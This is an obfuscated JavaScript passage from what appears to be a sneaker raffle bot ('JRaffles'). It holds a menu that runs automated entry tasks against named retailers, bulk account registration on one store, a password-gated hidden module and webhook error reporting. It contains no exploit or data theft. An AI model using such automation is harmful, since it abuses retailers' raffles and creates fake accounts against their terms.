                            _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x26d530), await _0x2c8410['function'](_0x2c8410, _0x26d530, _0x2fe5d6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x2fe5d6 = await _0x3eb23f(), _0x26d530 = await _0x550a62(_0x2c8410);
                                _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x26d530), await _0x2c8410['function'](_0x2c8410, _0x26d530, _0x2fe5d6);
                            }
                        }
                    } catch (_0x55770d) {
                        console['log'](_0x55770d), await _0x1a282d(0xfa0);
                    }
                    return _0x335798();
                }
                if (_0x9324de[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                        var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x2fe5d6 = await _0x3eb23f(), _0x26d530 = await _0x550a62(_0x2c8410);
                            _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x26d530), await _0x2c8410['function'](_0x2c8410, _0x26d530, _0x2fe5d6);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x2fe5d6 = await _0x3eb23f(), _0x26d530 = await _0x550a62(_0x2c8410);
                                _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x26d530), await _0x2c8410['function'](_0x2c8410, _0x26d530, _0x2fe5d6);
                            }
                        }
                    } catch (_0x122688) {
                        console['log'](_0x122688), await _0x1a282d(0xfa0);
                    }
                    return _0x335798();
                }
                if (_0x9324de[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x2fe5d6 = await _0x3eb23f();
                        return await _0x2c8410['function'](_0x2c8410, _0x2fe5d6), _0x335798();
                    }
                    var _0x2fe5d6 = await _0x3eb23f(), _0x39fc07 = await _0x550a62(_0x2c8410);
                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x39fc07), await _0x2c8410['function'](_0x2c8410, _0x39fc07, _0x2fe5d6), _0x335798();
                }
                if (_0x9324de[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x2fe5d6 = await _0x3eb23f(), _0x39fc07 = await _0x550a62(_0x2c8410);
                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x39fc07), await _0x2c8410['function'](_0x2c8410, _0x39fc07, _0x2fe5d6), _0x335798();
                }
                if (_0x9324de[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x2fe5d6 = await _0x3eb23f(), _0x39fc07 = await _0x550a62(_0x2c8410);
                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x39fc07), await _0x2c8410['function'](_0x2c8410, _0x39fc07, _0x2fe5d6), _0x335798();
                }
                if (_0x9324de[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x2fe5d6 = await _0x3eb23f(), _0x39fc07 = await _0x550a62(_0x2c8410);
                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x39fc07), await _0x2c8410['function'](_0x2c8410, _0x39fc07, _0x2fe5d6), _0x335798();
                } else {
                    if (_0x9324de[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                        var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x2fe5d6 = await _0x3eb23f(), _0x220761 = await _0x550a62(_0x2c8410);
                            return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x220761), await _0x2c8410['function'](_0x2c8410, _0x220761, _0x2fe5d6), _0x335798();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x2fe5d6 = await _0x3eb23f();
                                return await _0x2c8410['function'](_0x2c8410, null, _0x2fe5d6), _0x335798();
                            }
                        }
                        ;
                    } else {
                        if (_0x9324de[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                            var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction], _0x2fe5d6 = await _0x3eb23f(), _0x265e50 = await _0x550a62(_0x2c8410);
                            return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x265e50), await _0x2c8410['function'](_0x2c8410, _0x265e50, _0x2fe5d6), await _0x1a282d(0x1388), _0x335798();
                        } else {
                            if (_0x9324de[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x2fe5d6 = await _0x3eb23f(), _0x220761 = await _0x550a62(_0x2c8410);
                                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x220761), await _0x2c8410['function'](_0x2c8410, _0x220761, _0x2fe5d6), _0x335798();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x2fe5d6 = await _0x3eb23f();
                                        return await _0x2c8410['function'](_0x2c8410, null, _0x2fe5d6), _0x335798();
                                    }
                                }
                                ;
                            } else {
                                if (_0x9324de[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x2c8410);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x9324de[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                        var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x2fe5d6 = await _0x3eb23f(), _0x1ac6b6 = await _0x550a62(_0x2c8410);
                                            return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x1ac6b6), await _0x2c8410['function'](_0x2c8410, _0x1ac6b6, _0x2fe5d6), _0x335798();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x2fe5d6 = await _0x3eb23f(), _0x1ac6b6 = await _0x550a62(_0x2c8410);
                                                return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x1ac6b6), await _0x2c8410['function'](_0x2c8410, _0x1ac6b6, _0x2fe5d6), _0x335798();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x9324de[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                            var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x2fe5d6 = await _0x3eb23f(), _0x5d9c57 = await _0x550a62(_0x2c8410);
                                                return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x5d9c57), await _0x2c8410['function'](_0x2c8410, _0x5d9c57, _0x2fe5d6), _0x335798();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x2fe5d6 = await _0x3eb23f(), _0x5d9c57 = await _0x550a62(_0x2c8410);
                                                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x5d9c57), await _0x2c8410['function'](_0x2c8410, _0x5d9c57, _0x2fe5d6), _0x335798();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x9324de[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                                var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x2fe5d6 = await _0x3eb23f(), _0x3606d0 = await _0x550a62(_0x2c8410);
                                                    return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x3606d0), await _0x2c8410['function'](_0x2c8410, _0x3606d0, _0x2fe5d6), _0x335798();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x2fe5d6 = await _0x3eb23f(), _0x3606d0 = await _0x550a62(_0x2c8410);
                                                        return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x3606d0), await _0x2c8410['function'](_0x2c8410, _0x3606d0, _0x2fe5d6), _0x335798();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x9324de[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                                    var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x2fe5d6 = await _0x3eb23f(), _0x5c3d78 = await _0x550a62(_0x2c8410);
                                                        return _0x64917e['shuffleTasks'] && await _0x1ddf2f(_0x5c3d78), await _0x2c8410['function'](_0x2c8410, _0x5c3d78, _0x2fe5d6), _0x335798();
                                                    }
                                                } else {
                                                    if (_0x9324de[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x1a282d(0x3e8), _0x335798();
                                                    else {
                                                        if (_0x9324de[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x5a7968 = _0x9324de[taskModule]['name'], _0x2fe5d6 = await _0x3eb23f();
                                                            return await _0x382a88(_0x5a7968, _0x2fe5d6), _0x335798();
                                                        } else {
                                                            if (_0x9324de[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x46477f(_0x9324de[taskModule]['modules']);
                                                                var _0x2c8410 = _0x9324de[taskModule]['modules'][taskFunction];
                                                                return await _0x2c8410['function'](_0x2c8410), _0x335798();
                                                            } else {
                                                                if (_0x9324de[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x131daf = 0x0;
                                                                    for (const _0x17c406 in _0x64917e) {
                                                                        console['log']('(' + _0x131daf + ')\x20' + _0x17c406 + '\x20:\x20' + _0x64917e[_0x17c406]), _0x131daf++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x131daf + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x7ede3b = await _0x338ef7();
                                                                    if (_0x7ede3b == _0x131daf)
                                                                        return _0x335798();
                                                                    console['clear'];
                                                                    var _0x3cb4d1 = 0x0;
                                                                    for (var _0x1e4678 in _0x64917e) {
                                                                        if (_0x7ede3b == _0x3cb4d1) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x1e4678 + '\x20:'), _0x64917e[_0x1e4678] = await _0x56a24d(), _0x5a26e1['writeFileSync']('../settings.json', JSON['stringify'](_0x64917e));
                                                                            break;
                                                                        } else
                                                                            _0x3cb4d1++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x1a282d(0xbb8), _0x335798();
                                                                } else {
                                                                    if (_0x9324de[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x5220fd(), _0x335798();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x9324de[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x53cbef = await _0x13d3ad();
                                                                            _0x53cbef == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x830a18(), await afewFunction(_0x274aea[_0x770998], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x1a282d(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x335798();
            } catch (_0x43030e) {
                return console['log'](_0x43030e), _0x335798();
            }
        } catch (_0x13babf) {
            return console['log'](_0x13babf), await _0x1a282d(0x3a98);
        }
}
;
_0x51b97d('JRaffles\x20' + _0x1d5694), _0x5220fd();
try {
    _0x40da96();
} catch (_0x59a7b3) {
    var _0x10cf51 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x5b7d0c
            },
            {
                'name': 'Version',
                'value': '' + _0x1d5694
            },
            {
                'name': 'Error',
                'value': '' + _0x59a7b3
            }
        ]
    }];
    const _0x43c575 = { 'embeds': _0x10cf51 };
    _0x4e4e57(_0x4cd13, _0x43c575);
}